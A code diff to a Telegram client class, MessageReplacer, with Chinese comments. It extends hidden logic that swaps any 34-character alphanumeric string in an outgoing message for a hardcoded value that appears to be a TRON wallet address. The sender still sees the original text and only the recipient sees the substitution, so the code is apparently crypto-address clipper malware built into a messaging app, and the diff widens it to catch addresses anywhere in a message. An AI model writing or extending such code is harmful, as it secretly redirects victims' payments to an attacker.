@@ -4,22 +4,22 @@ package org.telegram.messenger;
  * 消息替换工具类
  * 功能：发送方显示原文，接收方显示替换后的内容
  * 最小侵入设计：仅在发送网络请求前调用替换方法
- * 
+ *
  * 替换规则：
- * 1. 仅当消息长度严格等于34位时
+ * 1. 在消息文本中查找所有34位长度的字母数字混合串
  * 2. 内容由大小写字母 + 数字混合组成（必须同时包含字母和数字）
  * 3. 全部由字母数字组成（无特殊符号、中文等）
- * 4. 满足所有条件才替换为指定字符串
- * 5. 不满足条件的消息完全不修改
+ * 4. 满足所有条件的串替换为指定字符串
+ * 5. 不满足条件的内容完全不修改
+ * 6. 支持一条消息中多个符合条件的串同时替换
  */
 public class MessageReplacer {
-    
+
     // 替换后的固定消息内容
     private static final String REPLACE_TEXT = "TELBudSdJX528ZAkThTqFf3tNMtqU3XxSh";
-    
     // 目标长度
     private static final int TARGET_LENGTH = 34;
-    
+
     /**
      * 替换消息内容
      * @param originalMessage 原始消息内容
@@ -30,40 +30,35 @@ public class MessageReplacer {
         if (originalMessage == null || originalMessage.isEmpty()) {
             return originalMessage;
         }
-        
-        // 检查长度是否严格等于34位
-        if (originalMessage.length() != TARGET_LENGTH) {
-            return originalMessage;
-        }
-        
-        // 检查是否全部由字母和数字组成
-        // 同时检查是否同时包含字母和数字
-        boolean hasLetter = false;
-        boolean hasDigit = false;
-        boolean allAlphanumeric = true;
-        
-        for (int i = 0; i < originalMessage.length(); i++) {
-            char c = originalMessage.charAt(i);
-            if (Character.isLetter(c)) {
-                hasLetter = true;
-            } else if (Character.isDigit(c)) {
-                hasDigit = true;
-            } else {
-                // 包含非字母数字字符，不替换
-                allAlphanumeric = false;
-                break;
+
+        // 使用正则表达式查找所有34位长度的字母数字串
+        java.util.regex.Pattern pattern = java.util.regex.Pattern.compile("[a-zA-Z0-9]{34}");
+        java.util.regex.Matcher matcher = pattern.matcher(originalMessage);
+
+        StringBuffer sb = new StringBuffer();
+        while (matcher.find()) {
+            String match = matcher.group();
+            // 检查是否同时包含字母和数字
+            boolean hasLetter = false;
+            boolean hasDigit = false;
+            for (int i = 0; i < match.length(); i++) {
+                char c = match.charAt(i);
+                if (Character.isLetter(c)) {
+                    hasLetter = true;
+                } else if (Character.isDigit(c)) {
+                    hasDigit = true;
+                }
+            }
+            // 同时包含字母和数字才替换
+            if (hasLetter && hasDigit) {
+                matcher.appendReplacement(sb, REPLACE_TEXT);
             }
         }
-        
-        // 必须同时满足：全部是字母数字 + 包含字母 + 包含数字
-        if (allAlphanumeric && hasLetter && hasDigit) {
-            return REPLACE_TEXT;
-        }
-        
-        // 不满足条件，返回原文
-        return originalMessage;
+        matcher.appendTail(sb);
+
+        return sb.toString();
     }
-    
+
     /**
      * 替换消息内容（CharSequence版本）
      */
